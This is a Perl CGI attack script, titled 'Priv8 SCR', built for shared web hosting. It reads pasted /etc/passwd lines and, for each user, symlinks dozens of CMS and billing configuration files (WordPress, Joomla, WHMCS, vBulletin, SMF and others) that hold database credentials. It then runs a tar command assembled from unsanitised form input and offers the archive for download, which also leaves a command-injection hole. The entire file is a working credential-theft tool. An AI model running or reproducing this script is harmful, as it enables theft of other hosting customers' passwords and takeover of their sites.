#!/usr/bin/perl -I/usr/local/bandmin
print "Content-type: text/html\n\n";
print'<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">

<head>
<meta http-equiv="Content-Language" content="en-us" />
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Priv8 SCR</title>
<style type="text/css">
.newStyle1 {
 font-family: tahoma, verdana, Arial;
 font-size: medium;
 color: #FFFFFF;
 background-color: #666666;
 text-align: center;
}
</style>
</head>
';
sub lil{
    ($user) = @_;
$msr = qx{pwd};
$kola=$msr."/".$user;
$kola=~s/\n//g;
symlink('/home/'.$user.'/public_html/beta/configuration.php',$kola.'-joomla.txt') ; 
 symlink('/home/'.$user.'/public_html/configuration.php',$kola.'-joomla.txt') ; 
 symlink('/home/'.$user.'/public_html/home/configuration.php',$kola.'-joomla - home.txt') ;
 symlink('/home/'.$user.'/public_html/wp-config.php',$kola.'-wordpress.txt') ; 
 symlink('/home/'.$user.'/public_html/blog/wp-config.php',$kola.'-wordpress.txt') ; 
 symlink('/home/'.$user.'/public_html/web/wp-config.php',$kola.'-wordpress - web.txt') ; 
 symlink('/home/'.$user.'/public_html/SSI.php',$kola.'- C M F .txt') ; 
 symlink('/home/'.$user.'/public_html/forum/SSI.php',$kola.'- C M F - forum.txt') ; 
 symlink('/home/'.$user.'/public_html/inc/config.php',$kola.'- MyBB.txt') ;
 symlink('/home/'.$user.'/public_html/forum/inc/config.php',$kola.'- MyBB - forum.txt') ;
 symlink('/home/'.$user.'/public_html/config.php',$kola.'- Other.txt') ;
 symlink('/home/'.$user.'/public_html/lib/config.php',$kola.'- Balitbang.txt') ; 
 symlink('/home/'.$user.'/public_html/client/configuration.php',$kola.'-clients.txt') ; 
 symlink('/home/'.$user.'/public_html/clients/configuration.php',$kola.'-client.txt') ; 
 symlink('/home/'.$user.'/public_html/billing/configuration.php',$kola.'-billing.txt') ; 
 symlink('/home/'.$user.'/public_html/billings/configuration.php',$kola.'-billings.txt') ; 
 symlink('/home/'.$user.'/public_html/whmcs/configuration.php',$kola.'- whmcs - whmcs.txt') ; 
 symlink('/home/'.$user.'/public_html/whm/configuration.php',$kola.'- whm - whm.txt');
 symlink('/home/'.$user.'/public_html/forum/includes/config.php',$kola.'- VBulletin - forum.txt');
 symlink('/home/'.$user.'/public_html/forum/config.php',$kola.'	- PhpBB - forum.txt') ;
 symlink('/home/'.$user.'/public_html/whmc/configuration.php',$kola.'- whmc - whmc.txt');
 symlink('/home/'.$user.'/public_html/submitticket.php',$kola.'	- whmcs2.txt');
 symlink('/home/'.$user.'/public_html/manage/configuration.php',$kola.'	-mangewhmcs.txt'); 
 symlink('/home/'.$user.'/public_html/myshop/configuration.php',$kola.'	-myshop.txt'); 
 symlink('/home/'.$user.'/public_html/support/configuration.php',$kola.'-support.txt');
 symlink('/home/'.$user.'/public_html/supports/configuration.php',$kola.'-supports.txt');
 symlink('/home/'.$user.'/public_html/oscommerce/includes/configure.php',$kola.'-oscommerce.txt');
 symlink('/home/'.$user.'/public_html/oscommerces/includes/configure.php',$kola.'-oscommerces.txt');
 symlink('/home/'.$user.'/public_html/shopping/includes/configure.php',$kola.'-shop-shopping.txt');
 symlink('/home/'.$user.'/public_html/sale/includes/configure.php',$kola.'-sale.txt');
 symlink('/home/'.$user.'/public_html/amember/config.inc.php',$kola.'-amember.txt');
 symlink('/home/'.$user.'/public_html/config.inc.php',$kola.'-amember2.txt');
 symlink('/home/'.$user.'/public_html/wp/wp-config.php',$kola.'- wordpress - wp.txt');
 symlink('/home/'.$user.'/public_html/wp/beta/wp-config.php',$kola.'- wwordpress - wp - beta.txt');
 symlink('/home/'.$user.'/public_html/beta/wp-config.php',$kola.'- wordpress - beta.txt');
 symlink('/home/'.$user.'/public_html/press/wp-config.php',$kola.'-wp13-press.txt');
 symlink('/home/'.$user.'/public_html/wordpress/wp-config.php',$kola.'- wordpress -wordpress.txt');
 symlink('/home/'.$user.'/public_html/wordpress/beta/wp-config.php',$kola.'- wordpress - wordpress-beta.txt');
 symlink('/home/'.$user.'/public_html/news/wp-config.php',$kola.'- wordpress -news.txt');
 symlink('/home/'.$user.'/public_html/new/wp-config.php',$kola.'- wordpress - new.txt');
 symlink('/home/'.$user.'/public_html/blogs/wp-config.php',$kola.'- wordpress - blogs.txt');
 symlink('/home/'.$user.'/public_html/home/wp-config.php',$kola.'- wordpress - home.txt');
 symlink('/home/'.$user.'/public_html/protal/wp-config.php',$kola.'- wordpress - protal.txt');
 symlink('/home/'.$user.'/public_html/site/wp-config.php',$kola.'- wordpress - site.txt');
 symlink('/home/'.$user.'/public_html/main/wp-config.php',$kola.'- wordpress - main.txt');
 symlink('/home/'.$user.'/public_html/test/wp-config.php',$kola.'- wordpress - test.txt');
 symlink('/home/'.$user.'/public_html/joomla/configuration.php',$kola.'-joomla - joomla .txt');
 symlink('/home/'.$user.'/public_html/protal/configuration.php',$kola.'- joomla - protal.txt');
 symlink('/home/'.$user.'/public_html/joo/configuration.php',$kola.'- joomla - joo.txt');
 symlink('/home/'.$user.'/public_html/cms/configuration.php',$kola.'- joomla - cms.txt');
 symlink('/home/'.$user.'/public_html/site/configuration.php',$kola.'- joomla - site.txt');
 symlink('/home/'.$user.'/public_html/main/configuration.php',$kola.'- joomla - main.txt');
 symlink('/home/'.$user.'/public_html/news/configuration.php',$kola.'- joomla - news.txt');
 symlink('/home/'.$user.'/public_html/new/configuration.php',$kola.'- joomla - new.txt');
 symlink('/home/'.$user.'/public_html/home/configuration.php',$kola.'- joomla - home.txt');
 symlink('/home/'.$user.'/public_html/vb/includes/config.php',$kola.'- vb.txt');
 symlink('/home/'.$user.'/public_html/vb3/includes/config.php',$kola.'- vb3.txt');
 symlink('/home/'.$user.'/public_html/cpanel/configuration.php',$kola.'-cpanel.txt');
 symlink('/home/'.$user.'/public_html/panel/configuration.php',$kola.'-panel.txt');
 symlink('/home/'.$user.'/public_html/host/configuration.php',$kola.'-host.txt');
 symlink('/home/'.$user.'/public_html/hosting/configuration.php',$kola.'-hosting.txt');
 symlink('/home/'.$user.'/public_html/hosts/configuration.php',$kola.'-hosts.txt');
 symlink('/home/'.$user.'/public_html/includes/dist-configure.php',$kola.'-zencart.txt'); 
 symlink('/home/'.$user.'/public_html/zencart/includes/dist-configure.php',$kola.'- zencart - shop.txt'); 
 symlink('/home/'.$user.'/public_html/shop/includes/dist-configure.php',$kola.'-shop-ZCshop.txt'); 
 symlink('/home/'.$user.'/public_html/Settings.php',$kola.'- smf.txt'); 
 symlink('/home/'.$user.'/public_html/smf/Settings.php',$kola.'- smf - smf.txt'); 
 symlink('/home/'.$user.'/public_html/forum/Settings.php',$kola.'- smf - forum.txt'); 
 symlink('/home/'.$user.'/public_html/forums/Settings.php',$kola.'- smf - forums.txt'); 
 symlink('/home/'.$user.'/public_html/upload/includes/config.php',$kola.'- upload .txt');
 symlink('/home/'.$user.'/public_html/incl/config.php',$kola.'- malay.txt');
 symlink('/home/'.$user.'/public_html/config/koneksi.php',$kola.'- lokomedia.txt');
 symlink('/home/'.$user.'/system/sistem.php',$kola.'- lokomedia.txt'); 
 }
if ($ENV{'REQUEST_METHOD'} eq 'POST') {
  read(STDIN, $buffer, $ENV{'CONTENT_LENGTH'});
} else {
  $buffer = $ENV{'QUERY_STRING'};
}
@pairs = split(/&/, $buffer);
foreach $pair (@pairs) {
  ($name, $value) = split(/=/, $pair);
  $name =~ tr/+/ /;
  $name =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;
  $value =~ tr/+/ /;
  $value =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;
  $FORM{$name} = $value;
}
if ($FORM{pass} eq ""){
print '
<body class="newStyle1">
<p>&nbsp;</p>
<form method="post">
<textarea name="pass" style="width: 543px; height: 400px"></textarea>
<br /><br />
<input name="tar" type="text" style="width: 212px" /><br /><br />
<input name="Submit1" type="submit" value="Hajar ..!" style="width: 99px" />
<br />
</form>';
}else{
@lines =<$FORM{pass}>;
$y = @lines;
open (MYFILE, ">tar.tmp");
print MYFILE "tar -czf ".$FORM{tar}.".tar ";
for ($ka=0;$ka<$y;$ka++){
while(@lines[$ka]  =~ m/(.*?):x:/g){
&lil($1);
print MYFILE $1.".txt ";
for($kd=1;$kd<18;$kd++){
print MYFILE $1.$kd.".txt ";
}
}
 }
print'<body class="newStyle1">
<p>Done !!</p>
<p>&nbsp;</p>';
if($FORM{tar} ne ""){
open(INFO, "tar.tmp");
@lines =<INFO> ;
close(INFO);
system(@lines);
print'<p><a href="'.$FORM{tar}.'.tar"> download  file</a></p>';
}
}
 print"
</body>
</html>";